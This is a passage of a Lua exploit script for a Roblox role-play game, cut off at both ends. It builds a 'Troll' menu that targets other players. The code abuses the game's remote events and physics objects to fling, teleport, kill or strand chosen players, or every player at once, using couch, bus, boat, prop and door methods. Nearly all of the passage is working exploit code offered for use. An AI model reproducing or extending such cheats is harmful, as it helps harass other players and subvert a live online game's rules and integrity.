    local bv = seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")

    if bv then bv:Destroy() end

    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

end

    

    local function getPlayerList()

        local players = Players:GetPlayers()

        local playerNames = {}

        for _, player in ipairs(players) do

            if player ~= LocalPlayer then

                table.insert(playerNames, player.Name)

            end

        end

        return playerNames

    end



local function playerCorrupt()

    local targetPlayer = Players:FindFirstChild(getgenv().Target)

    if not targetPlayer then

        return

    end

    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

        return

    end



    local args = { [1] = "ClearAllTools" }

    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))

    local args = { [1] = "PickingTools", [2] = "Couch" }

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))



    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)

    if not couch then

        return

    end



    couch.Name = "Chaos.Couch"

    local seat1 = couch:FindFirstChild("Seat1")

    local seat2 = couch:FindFirstChild("Seat2")

    local handle = couch:FindFirstChild("Handle")

    if seat1 and seat2 and handle then

        seat1.Disabled = true

        seat2.Disabled = true

        handle.Name = "Handle "

    else

        return

    end

    couch.Parent = LocalPlayer.Character



    local tet = Instance.new("BodyVelocity", seat1)

    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

    tet.P = 1250

    tet.Velocity = Vector3.new(0, 0, 0)

    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"



    repeat

        for m = 1, 35 do

            local pos = { x = 0, y = 0, z = 0 }

            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart

            if not tRoot then break end

            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)

            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)

            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)

            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)

            task.wait()

        end

        tet:Destroy()

        couch.Parent = LocalPlayer.Backpack

        task.wait()

        couch:FindFirstChild("Handle ").Name = "Handle"

        task.wait(0.2)

        couch.Parent = LocalPlayer.Character

        task.wait()

        couch.Parent = LocalPlayer.Backpack

        couch.Handle.Name = "Handle "

        task.wait(0.2)

        couch.Parent = LocalPlayer.Character

        tet = Instance.new("BodyVelocity", seat1)

        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

        tet.P = 1250

        tet.Velocity = Vector3.new(0, 0, 0)

        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true

    task.wait()

    couch.Parent = LocalPlayer.Backpack

    seat1.CFrame = CFrame.new(Vector3.new(9e10, 9e10, 9e10))

    seat2.CFrame = CFrame.new(Vector3.new(9e10, 9e10, 9e10))

    couch.Parent = LocalPlayer.Character

    task.wait(0.1)

    couch.Parent = LocalPlayer.Backpack

    task.wait(2)

    local bv = seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")

    if bv then bv:Destroy() end

    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

end



    local killDropdown = Troll:AddDropdown({

        Name = "Select Player",

        Options = getPlayerList(),

        Default = "",

        Callback = function(value)

            selectedPlayerName = value

            getgenv().Target = value

        end

    })



    Troll:AddButton({

        Name = "Update Player List",

        Callback = function()

            local tablePlayers = Players:GetPlayers()

            local newPlayers = {}

            if killDropdown and #tablePlayers > 0 then

                for _, player in ipairs(tablePlayers) do

                    if player.Name ~= LocalPlayer.Name then

                        table.insert(newPlayers, player.Name)

                    end

                end

                killDropdown:Set(newPlayers)

                if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then

                    selectedPlayerName = nil

                    getgenv().Target = nil

                    killDropdown:SetValue("")

                end

            else

            end

        end

    })



    Troll:AddButton({

        Name = "Teleport to Player",

        Callback = function()

            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then

                return

            end

            local character = LocalPlayer.Character

            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

            if not humanoidRootPart then

                return

            end



            local targetPlayer = Players:FindFirstChild(selectedPlayerName)

            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

                humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame

            else

            end

        end

    })



    Troll:AddToggle({

        Name = "View Player",

        Default = false,

        Callback = function(value)

            local Camera = workspace.CurrentCamera



            local function UpdateCamera()

                if value then

                    local targetPlayer = Players:FindFirstChild(selectedPlayerName)

                    if targetPlayer and targetPlayer.Character then

                        local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")

                        if humanoid then

                            Camera.CameraSubject = humanoid

                        end

                    end

                else

                    if LocalPlayer.Character then

                        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")

                        if humanoid then

                            Camera.CameraSubject = humanoid

                        end

                    end

                end

            end



            if value then

                if not getgenv().CameraConnection then

                    getgenv().CameraConnection = RunService.Heartbeat:Connect(UpdateCamera)

                end

            else

                if getgenv().CameraConnection then

                    getgenv().CameraConnection:Disconnect()

                    getgenv().CameraConnection = nil

                end

                UpdateCamera()

            end

        end

    })



    local MethodSection = Troll:AddSection({ Name = "Methods" })



    Troll:AddDropdown({

        Name = "Select Killing Method",

        Options = {"Couch", "Couch without going to the target"},

        Default = "Couch",

        Callback = function(value)

            methodKill = value

        end

    })



    Troll:AddButton({

        Name = "Kill Player",

        Callback = function()

            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then

                return

            end

            if methodKill == "Couch" then

                KillPlayerCouch()

            elseif methodKill == "Couch without going to the target" then

                KillWithCouch()

            else

                local character = LocalPlayer.Character

                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                if not humanoidRootPart then

                    return

                end



                local originalPosition = humanoidRootPart.CFrame



                local function GetBus()

                    local vehicles = game.Workspace:FindFirstChild("Vehicles")

                    if vehicles then

                        return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")

                    end

                    return nil

                end



                local bus = GetBus()



                if not bus then

                    humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)

                    task.wait(0.5)

                    local remoteEvent = ReplicatedStorage:FindFirstChild("RE")

                    if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then

                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")

                    end

                    task.wait(1)

                    bus = GetBus()

                end



                if bus then

                    local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")

                    if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then

                        repeat

                            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)

                            task.wait()

                        until character.Humanoid.Sit or not bus.Parent

                        if character.Humanoid.Sit or not bus.Parent then

                            for k, v in pairs(bus.Body:GetChildren()) do

                                if v:IsA("Seat") then

                                    v.CanTouch = false

                                end

                            end

                        end

                    end

                end



                local function TrackPlayer()

                    while true do

                        if selectedPlayerName then

                            local targetPlayer = Players:FindFirstChild(selectedPlayerName)

                            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

                                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")

                                if targetHumanoid and targetHumanoid.Sit then

                                    if character.Humanoid then

                                        bus:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))

                                        task.wait(0.2)



                                        local function simulateJump()

                                            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")

                                            if humanoid then

                                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)

                                            end

                                        end



                                        simulateJump()

                                        task.wait(0.5)

                                        humanoidRootPart.CFrame = originalPosition

                                    end

                                    break

                                else

                                    local targetRoot = targetPlayer.Character.HumanoidRootPart

                                    local time = tick() * 35

                                    local lateralOffset = math.sin(time) * 4

                                    local frontBackOffset = math.cos(time) * 20

                                    bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))

                                end

                            end

                        end

                        RunService.RenderStepped:Wait()

                    end

                end



                spawn(TrackPlayer)

            end

        end

    })



    Troll:AddButton({

        Name = "Bring Player",

        Callback = function()

            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then

                return

            end

            if methodKill == "Couch" then

                BringPlayerLLL()

            elseif methodKill == "Couch without going to the target" then

                BringWithCouch()

            else

                local character = LocalPlayer.Character

                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                if not humanoidRootPart then

                    return

                end



                local originalPosition = humanoidRootPart.CFrame



                local function GetBus()

                    local vehicles = game.Workspace:FindFirstChild("Vehicles")

                    if vehicles then

                        return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")

                    end

                    return nil

                end



                local bus = GetBus()



                if not bus then

                    humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)

                    task.wait(0.5)

                    local remoteEvent = ReplicatedStorage:FindFirstChild("RE")

                    if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then

                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")

                    end

                    task.wait(1)

                    bus = GetBus()

                end



                if bus then

                    local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")

                    if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then

                        repeat

                            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)

                            task.wait()

                        until character.Humanoid.Sit or not bus.Parent

                    end

                end



                local function TrackPlayer()

                    while true do

                        if selectedPlayerName then

                            local targetPlayer = Players:FindFirstChild(selectedPlayerName)

                            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

                                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")

                                if targetHumanoid and targetHumanoid.Sit then

                                    if character.Humanoid then

                                        bus:SetPrimaryPartCFrame(originalPosition)

                                        task.wait(0.7)

                                        local args = { [1] = "DeleteAllVehicles" }

                                        ReplicatedStorage.RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))

                                    end

                                    break

                                else

                                    local targetRoot = targetPlayer.Character.HumanoidRootPart

                                    local time = tick() * 35

                                    local lateralOffset = math.sin(time) * 4

                                    local frontBackOffset = math.cos(time) * 20

                                    bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))

                                end

                            end

                        end

                        RunService.RenderStepped:Wait()

                    end

                end



                spawn(TrackPlayer)

            end

        end

    })

Troll:AddSection({Name = "Auto Method"})

Troll:AddToggle({

    Name = "Auto Fling",

    Default = false,

    Callback = function(state)



        flingActive = state

        if state and selectedPlayerName then

            local target = Players:FindFirstChild(selectedPlayerName)

            if not target or not target.Character then return end

            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

            local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

            if not root or not tRoot then return end

            local char = LocalPlayer.Character

            local hum = char:FindFirstChildOfClass("Humanoid")

            local original = root.CFrame



local args = {

    "ClearAllTools"

}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))



task.wait(0.2)





            local args = {

                [1] = "PickingTools",

                [2] = "Couch"

            }

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))



            task.wait(0.3)

            local tool = LocalPlayer.Backpack:FindFirstChild("Couch")

            if tool then

                tool.Parent = char

            end

                task.wait(0.2)

                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)

task.wait(0.25)



            workspace.FallenPartsDestroyHeight = 0/0

            local bv = Instance.new("BodyVelocity")

            bv.Name = "FlingForce"

            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)

            bv.MaxForce = Vector3.new(1/0, 1/0, 1/0)

            bv.Parent = root

            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

            hum.PlatformStand = false

            cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum



            task.spawn(function()

                local angle = 0

                local parts = {root}

                while flingActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do

                    local tHum = target.Character:FindFirstChildOfClass("Humanoid")

                    if tHum.Sit then break end

                    angle += 50



                    for _, part in ipairs(parts) do

                        local pos_x = target.Character.HumanoidRootPart.Position.X

                        local pos_y = target.Character.HumanoidRootPart.Position.Y

                        local pos_z = target.Character.HumanoidRootPart.Position.Z

                        pos_x = pos_x + (target.Character.HumanoidRootPart.Velocity.X / 1.5)

                        pos_y = pos_y + (target.Character.HumanoidRootPart.Velocity.Y / 1.5)

                        pos_z = pos_z + (target.Character.HumanoidRootPart.Velocity.Z / 1.5)

                        root.CFrame = CFrame.new(pos_x, pos_y, pos_z) * CFrame.Angles(math.rad(angle), 0, 0)

                    end



                    root.Velocity = Vector3.new(9e8, 9e8, 9e8)

                    root.RotVelocity = Vector3.new(9e8, 9e8, 9e8)

                    task.wait()

                end

                flingActive = false

                bv:Destroy()

                hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

                hum.PlatformStand = false

                root.CFrame = original

                cam.CameraSubject = hum

                for _, p in pairs(char:GetDescendants()) do

                    if p:IsA("BasePart") then

                        p.Velocity = Vector3.zero

                        p.RotVelocity = Vector3.zero

                    end

                end

                hum:UnequipTools()

                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

            end)

        end

    end

})


local kill = Troll:AddSection({Name = "Boat Method"})



Troll:AddButton({

    Name = "Fling Boat All",

    Callback = function()

        local Player = game.Players.LocalPlayer

    local Character = Player.Character

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    local RootPart = Character:FindFirstChild("HumanoidRootPart")

    local Vehicles = game.Workspace:FindFirstChild("Vehicles")

    local OldPos = RootPart.CFrame

    local Angles = 0

    local PCar = Vehicles:FindFirstChild(Player.Name.."Car")

    

            if not PCar then  

                if RootPart then  

                    RootPart.CFrame = CFrame.new(1754, -2, 58)  

                    task.wait(0.5)  

                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")  

                    task.wait(0.5)  

                    PCar = Vehicles:FindFirstChild(Player.Name.."Car")  

                    task.wait(0.5)  

                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  

                    if Seat then  

                        repeat  

                            task.wait()  

                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  

                        until Humanoid.Sit  

                    end  

                end  

            end  

      

            task.wait(0.5)  

            PCar = Vehicles:FindFirstChild(Player.Name.."Car")  

      

            if PCar then  

                if not Humanoid.Sit then  

                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  

                    if Seat then  

                        repeat  

                            task.wait()  

                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  

                        until Humanoid.Sit  

                    end  

                end  

            end  

      

            local SpinGyro = Instance.new("BodyGyro")  

            SpinGyro.Parent = PCar.PrimaryPart  

            SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)  

            SpinGyro.P = 1e7  

            SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)  

      

            local function flingPlayer(TargetC, TargetRP, TargetH)

    Angles = 0  

                local endTime = tick() + 1  

                while tick() < endTime do  

                    Angles = Angles + 100  

                    task.wait()  

      

                    local kill = function(alvo, pos, angulo)  

                        PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)  

                    end  

      

                    kill(TargetRP, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(Angles), 0, 0))  

                    kill(TargetRP, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(Angles), 0, 0))  

                    kill(TargetRP, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))  

                    kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))  

                    kill(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  

                    kill(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  

                end  

            end  

      

            for _, Target in pairs(game.Players:GetPlayers()) do  

                if Target ~= Player then  

                    local TargetC = Target.Character  

                    local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")  

                    local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")  

      

                    if TargetC and TargetH and TargetRP then  

                        flingPlayer(TargetC, TargetRP, TargetH)  

                    end  

                end  

            end  

      

            task.wait(0.5)  

            PCar:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))  

            task.wait(0.5)  

            Humanoid.Sit = false  

            task.wait(0.5)  

            RootPart.CFrame = OldPos  

      

            SpinGyro:Destroy()  

    end

})



Troll:AddButton({

    Name = "Fling Boat",

    Callback = function()

        if not selectedPlayerName or not game.Players:FindFirstChild(selectedPlayerName) then

            return

        end



        local Player = game.Players.LocalPlayer

        local Character = Player.Character

        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")

        local Vehicles = game.Workspace:FindFirstChild("Vehicles")



        if not Humanoid or not RootPart then

            return

        end



        local function spawnBoat()

            RootPart.CFrame = CFrame.new(1754, -2, 58)

            task.wait(0.5)

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")

            task.wait(1)

            return Vehicles:FindFirstChild(Player.Name.."Car")

        end



        local PCar = Vehicles:FindFirstChild(Player.Name.."Car") or spawnBoat()

        if not PCar then

            return

        end



        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")

        if not Seat then

            return

        end



        repeat 

            task.wait(0.1)

            RootPart.CFrame = Seat.CFrame * CFrame.new(0, 1, 0)

        until Humanoid.SeatPart == Seat



        local TargetPlayer = game.Players:FindFirstChild(selectedPlayerName)

        if not TargetPlayer or not TargetPlayer.Character then

            return

        end



        local TargetC = TargetPlayer.Character

        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")

        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")



        if not TargetRP or not TargetH then

            return

        end



        local Spin = Instance.new("BodyAngularVelocity")

        Spin.Name = "Spinning"

        Spin.Parent = PCar.PrimaryPart

        Spin.MaxTorque = Vector3.new(0, math.huge, 0)

        Spin.AngularVelocity = Vector3.new(0, 369, 0) 



        local function moveCar(TargetRP, offset)

            if PCar and PCar.PrimaryPart then

                PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + offset))

            end

        end



        task.spawn(function()

            while PCar and PCar.Parent and TargetRP and TargetRP.Parent do

                task.wait(0.01) 

                

                moveCar(TargetRP, Vector3.new(0, 1, 0))  

                moveCar(TargetRP, Vector3.new(0, -2.25, 5))  

                moveCar(TargetRP, Vector3.new(0, 2.25, 0.25))  

                moveCar(TargetRP, Vector3.new(-2.25, -1.5, 2.25))  

                moveCar(TargetRP, Vector3.new(0, 1.5, 0))  

                moveCar(TargetRP, Vector3.new(0, -1.5, 0))  



                if PCar and PCar.PrimaryPart then

                    local Rotation = CFrame.Angles(

                        math.rad(math.random(-369, 369)),  

                        math.rad(math.random(-369, 369)), 

                        math.rad(math.random(-369, 369))

                    )

                    PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + Vector3.new(0, 1.5, 0)) * Rotation)

                end

            end



            if Spin and Spin.Parent then

                Spin:Destroy()

            end

        end)

    end

})



Troll:AddButton({

    Name = "Cancel Fling Boat",

    Callback = function()

        local Player = game.Players.LocalPlayer

        local Character = Player.Character

        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")

        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

        local Vehicles = game.Workspace:FindFirstChild("Vehicles")



        if not RootPart or not Humanoid then

            return

        end



        Humanoid.PlatformStand = true



        for _, obj in pairs(RootPart:GetChildren()) do

            if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then

                obj:Destroy()

            end

        end



        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")

        task.wait(0.5)



        local PCar = Vehicles and Vehicles:FindFirstChild(Player.Name.."Car")

        if PCar and PCar.PrimaryPart then

            for _, obj in pairs(PCar.PrimaryPart:GetChildren()) do

                if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then

                    obj:Destroy()

                end

            end

        end



        task.wait(1)



        local safePos = Vector3.new(0, 1000, 0)

        local bp = Instance.new("BodyPosition", RootPart)

        bp.Position = safePos

        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)



        local bg = Instance.new("BodyGyro", RootPart)

        bg.CFrame = RootPart.CFrame

        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)



        task.wait(3)



        bp:Destroy()

        bg:Destroy()

        Humanoid.PlatformStand = false



    end

})

Troll:AddSection({Name = "Prop Method"})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local selectedPlayerName = nil

local FlingConnection = nil
local BringConnection = nil
local KillConnection = nil
local RGBConnection = nil
local OrbitConnection = nil

local RGBEnabled = false

-- Atualizar lista de players
local function getPlayerList()
    local t = {}
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(t, plr.Name)
        end
    end
    return t
end

local killDropdown = Troll:AddDropdown({
    Name = "Select Player",
    Options = getPlayerList(),
    Default = "",
    Callback = function(value)
        selectedPlayerName = value
        getgenv().Target = value
    end
})

-- Botão manual de atualização
Troll:AddButton({
    Name = "Update Player List",
    Callback = function()
        local currentList = getPlayerList()

        if killDropdown then
            -- Atualiza as opções do Dropdown
            killDropdown:Set(currentList)

            -- Verifica se o alvo selecionado ainda está no jogo
            if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then
                selectedPlayerName = nil
                getgenv().Target = nil
                killDropdown:SetValue("")
            end
        end
    end
})

-- Cache de props
local propCache = {}
local lastCacheUpdate = 0

local function GetMyProps()
    local currentTime = tick()
    if currentTime - lastCacheUpdate < 0.5 and #propCache > 0 then
        return propCache
    end

    propCache = {}
    local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
    if not workspaceCom then return propCache end

    local myName = LocalPlayer.Name

    for _, folder in ipairs(workspaceCom:GetChildren()) do
        for _, prop in ipairs(folder:GetChildren()) do
            if prop.Name:find(myName) and prop:FindFirstChild("SetCurrentCFrame") then
                table.insert(propCache, prop)
            end
        end
    end

    lastCacheUpdate = currentTime
    return propCache
end

local function TeleportProps(targetCFrame)
    local props = GetMyProps()
    for _, prop in ipairs(props) do
        task.spawn(function()
            pcall(function()
                prop.SetCurrentCFrame:InvokeServer(targetCFrame)
            end)
        end)
    end
end

local function ClearAllProps()
    pcall(function()
        ReplicatedStorage.RE:FindFirstChild("1Clea1rTool1s"):FireServer("ClearAllProps")
    end)
end

local function GetTarget()
    if not selectedPlayerName then return nil end
    return Players:FindFirstChild(selectedPlayerName)
end

-- PROP FLING
Troll:AddToggle({
    Name = "Prop Fling",
    Default = false,
    Callback = function(Value)
        if FlingConnection then
            FlingConnection:Disconnect()
            FlingConnection = nil
        end

        if not Value then return end

        FlingConnection = RunService.Heartbeat:Connect(function()
            local target = GetTarget()
            if not target or not target.Character then return end

            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = target.Character:FindFirstChild("Humanoid")
            if not targetRoot or not targetHumanoid then return end

            if targetHumanoid.Sit then
                TeleportProps(CFrame.new(1082537, 81322368, -4719626.5))
                task.delay(1.5, ClearAllProps)
            else
                TeleportProps(
                    targetRoot.CFrame * CFrame.new(0, -(targetHumanoid.HipHeight + 2), 0)
                )
            end
        end)
    end
})

-- PROP BRING
Troll:AddToggle({
    Name = "Prop Bring",
    Default = false,
    Callback = function(Value)
        if BringConnection then
            BringConnection:Disconnect()
            BringConnection = nil
        end

        if not Value then return end

        BringConnection = RunService.Heartbeat:Connect(function()
            local target = GetTarget()
            if not target or not target.Character then return end

            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = target.Character:FindFirstChild("Humanoid")
            local myChar = LocalPlayer.Character

            if not targetRoot or not targetHumanoid then return end
            if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end

            if targetHumanoid.Sit then
                TeleportProps(
                    myChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                )
                task.delay(1.5, ClearAllProps)
            else
                TeleportProps(
                    targetRoot.CFrame * CFrame.new(0, -(targetHumanoid.HipHeight + 2), 0)
                )
            end
        end)
    end
})

-- PROP KILL
Troll:AddToggle({
    Name = "Prop Kill",
    Default = false,
    Callback = function(Value)
        if KillConnection then
            KillConnection:Disconnect()
            KillConnection = nil
        end

        if not Value then return end

        KillConnection = RunService.Heartbeat:Connect(function()
            local target = GetTarget()
            if not target or not target.Character then return end

            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = target.Character:FindFirstChild("Humanoid")
            if not targetRoot or not targetHumanoid then return end

            if targetHumanoid.Sit then
                TeleportProps(CFrame.new(216.457, -1338.86, -477.942))
                task.delay(1.5, ClearAllProps)
            else
                TeleportProps(
                    targetRoot.CFrame * CFrame.new(0, -(targetHumanoid.HipHeight + 2), 0)
                )
            end
        end)
    end
})

Troll:AddToggle({
    Name = "Prop RGB",
    Default = false,
    Callback = function(Value)
        RGBEnabled = Value
        
        if RGBConnection then
            RGBConnection:Disconnect()
            RGBConnection = nil
        end
        
        if not RGBEnabled then return end
        
        RGBConnection = RunService.Heartbeat:Connect(function()
            if not RGBEnabled then return end
            
            local hue = (tick() * 0.5) % 1
            local color = Color3.fromHSV(hue, 1, 1)
            
            local props = GetMyProps()
            
            for _, prop in ipairs(props) do
                if prop and prop.Parent and prop:FindFirstChild("ChangePropColor") then
                    pcall(function()
                        prop.ChangePropColor:InvokeServer(color)
                    end)
                end
            end
            
            pcall(function()
                LocalPlayer.PlayerGui
                    :WaitForChild("NoResetGUIHandler")
                    :WaitForChild("PropColorPicker")
                    :WaitForChild("SetColor")
                    :FireServer(color)
            end)
        end)
    end
})

Troll:AddToggle({
    Name = "Orbit Prop",
    Default = false,
    Callback = function(Value)
        if OrbitConnection then
            OrbitConnection:Disconnect()
            OrbitConnection = nil
        end

        if not Value then return end

        local speed = 2
        local radius = 6
        local heightOffset = -3
        local angle = 0

        OrbitConnection = RunService.Heartbeat:Connect(function(delta)
            local char = LocalPlayer.Character
            if not char then return end

            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end

            local props = GetMyProps()
            if not props or #props == 0 then return end

            angle += delta * speed

            local spacing = (math.pi * 2) / #props

            for i, prop in ipairs(props) do
                if not prop or not prop.Parent then continue end

                local currentAngle = angle + (i * spacing)

                local x = math.cos(currentAngle) * radius
                local z = math.sin(currentAngle) * radius

                local worldPos = root.Position + Vector3.new(x, heightOffset, z)

                local lookAt = CFrame.lookAt(worldPos, root.Position)

                local remote = prop:FindFirstChild("SetCurrentCFrame")
                if remote then
                    pcall(function()
                        remote:InvokeServer(lookAt)
                    end)
                end
            end
        end)
    end
})

local kill = Troll:AddSection({Name = "Click Methods"})

Troll:AddButton({
  Name = "Click Fling Portas [Beta]",
Description = "Para Usar, Recomendo chegar perto de outras portas, apos ela ir até você, clique no jogador que deseja flingar",
  Callback = function()
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")

-- Alvo invisível (BlackHole)
local BlackHole = Instance.new("Part")
BlackHole.Size = Vector3.new(100000, 100000, 100000)
BlackHole.Transparency = 1
BlackHole.Anchored = true
BlackHole.CanCollide = false
BlackHole.Name = "BlackHoleTarget"
BlackHole.Parent = Workspace

-- Attachment base no BlackHole
local baseAttachment = Instance.new("Attachment")
baseAttachment.Name = "Luscaa_BlackHoleAttachment"
baseAttachment.Parent = BlackHole

-- Atualiza posição do BlackHole
RunService.Heartbeat:Connect(function()
	BlackHole.CFrame = HRP.CFrame
end)

-- Lista de portas controladas
local ControlledDoors = {}

-- Prepara uma porta para ser controlada
local function SetupPart(part)
	if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
	if part:FindFirstChild("Luscaa_Attached") then return end

	part.CanCollide = false

	for _, obj in ipairs(part:GetChildren()) do
		if obj:IsA("AlignPosition") or obj:IsA("Torque") or obj:IsA("Attachment") then
			obj:Destroy()
		end
	end

	local marker = Instance.new("BoolValue", part)
	marker.Name = "Luscaa_Attached"

	local a1 = Instance.new("Attachment", part)

	local align = Instance.new("AlignPosition", part)
	align.Attachment0 = a1
	align.Attachment1 = baseAttachment
	align.MaxForce = 1e20
	align.MaxVelocity = math.huge
	align.Responsiveness = 99999

	local torque = Instance.new("Torque", part)
	torque.Attachment0 = a1
	torque.RelativeTo = Enum.ActuatorRelativeTo.World
	torque.Torque = Vector3.new(
		math.random(-10e5, 10e5) * 10000,
		math.random(-10e5, 10e5) * 10000,
